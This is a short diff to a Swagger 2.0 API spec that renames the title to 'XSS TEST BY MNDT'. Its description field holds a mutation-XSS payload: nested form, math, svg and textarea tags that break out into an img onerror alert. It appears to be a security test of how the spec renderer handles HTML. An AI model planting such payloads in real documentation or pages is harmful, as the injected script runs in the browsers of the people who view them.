@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: Classic API Resource Documentation
+  title: XSS TEST BY MNDT
   description: |
      <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS Testing') src=1>"></form>
   version: production
